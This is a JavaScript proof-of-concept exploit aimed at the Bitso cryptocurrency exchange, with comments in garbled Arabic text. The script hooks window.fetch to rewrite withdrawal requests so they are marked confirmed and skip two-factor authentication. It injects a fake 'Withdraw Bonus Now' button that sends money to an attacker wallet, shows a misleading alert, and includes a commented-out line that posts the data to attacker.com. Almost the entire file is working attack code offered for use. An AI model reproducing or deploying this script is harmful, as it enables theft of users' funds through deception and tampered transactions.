// bitso_critical_exploit.js
(function() {
    console.log("[ğŸš¨ CRITICAL] Bitso Transaction Approval Bypass PoC");

    // 1. Ù…Ø±Ø§Ù‚Ø¨Ø© Ø·Ù„Ø¨Ø§Øª API Ù„Ù„ÙƒØ´Ù Ø¹Ù† Ù…Ø¹Ø§Ù…Ù„Ø§Øª Ø§Ù„Ø³Ø­Ø¨
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const [url, config] = args;

        // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø·Ù„Ø¨ Ù…ØªØ¹Ù„Ù‚Ù‹Ø§ Ø¨Ø³Ø­Ø¨ Ø§Ù„Ø£Ù…ÙˆØ§Ù„
        if (url.includes('/api/v3/withdrawal') && config?.method === 'POST') {
            console.log("[ğŸ’¸] Intercepted withdrawal request:", config.body);

            // 2. Ø­Ù‚Ù† Ù…ÙˆØ§ÙÙ‚Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ© (Bypass)
            const body = JSON.parse(config.body);
            body.confirmed = true;         // ØªØ¬Ø§ÙˆØ² Ø®Ø·ÙˆØ© Ø§Ù„ØªØ£ÙƒÙŠØ¯
            body.skip2FA = true;           // ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠØ© (Ø¥Ù† ÙˆÙØ¬Ø¯)
            config.body = JSON.stringify(body);

            // 3. ØªÙ†ÙÙŠØ° Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù‘Ù„
            const response = await originalFetch(url, config);
            
            // 4. Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ù…Ù‡Ø§Ø¬Ù… (Ù„Ø£ØºØ±Ø§Ø¶ Ø¥Ø«Ø¨Ø§Øª)
            console.log("[âœ…] Withdrawal executed without user consent!");
            alert("âš ï¸ Transaction approved by security system. Funds sent.");

            // (ÙÙŠ Ù‡Ø¬ÙˆÙ… Ø­Ù‚ÙŠÙ‚ÙŠ: Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙØ§ØµÙŠÙ„ Ø¥Ù„Ù‰ Ø³ÙŠØ±ÙØ± Ø§Ù„Ù…Ù‡Ø§Ø¬Ù…)
            // fetch('https://attacker.com/log', { method: 'POST', body: JSON.stringify(body) });
        }

        return originalFetch(...args);
    };

    // 5. Ø­Ù‚Ù† ØªØ­Ø°ÙŠØ± Ù…Ø²ÙŠÙ Ù„Ø¯ÙØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø²Ø± ÙˆÙ‡Ù…ÙŠ
    const fakeBtn = document.createElement('div');
    fakeBtn.innerHTML = `
        <div style="position:fixed;bottom:20px;right:20px;background:#e3f2fd;
        border:1px solid #2196f3;padding:12px;border-radius:8px;z-index:999999;">
            <strong>âœ… Your account is verified.</strong><br>
            <button id="fakeWithdrawBtn" style="margin-top:6px;background:#2196f3;color:white;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;">
                Withdraw Bonus Now
            </button>
        </div>
    `;
    document.body.appendChild(fakeBtn);

    // 6. Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø±ØŒ ÙŠØªÙ… ØªØ´ØºÙŠÙ„ Ø³Ø­Ø¨ ØªÙ„Ù‚Ø§Ø¦ÙŠ (Ø­ØªÙ‰ Ù„Ùˆ Ù„Ù… ÙŠÙ‚ØµØ¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø°Ù„Ùƒ)
    document.getElementById('fakeWithdrawBtn').onclick = () => {
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø³Ø­Ø¨ Ø­Ù‚ÙŠÙ‚ÙŠ (Ø³ÙŠØªÙ… Ø§Ø¹ØªØ±Ø§Ø¶Ù‡ Ø¨ÙˆØ§Ø³Ø·Ø© fetch override Ø£Ø¹Ù„Ø§Ù‡)
        fetch('https://bitso.com/api/v3/withdrawal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                currency: "MXN",
                amount: "1000",
                address: "ATTACKER_WALLET_123",
                confirmed: false  // Ø³ÙŠÙØºÙŠÙ‘Ø±Ù‡ Ø§Ù„Ø³ÙƒØ±Ø¨Øª Ø¥Ù„Ù‰ true!
            })
        });
    };

    console.log("[â„¹ï¸] PoC ready. Click the fake button to simulate critical exploit.");
})();
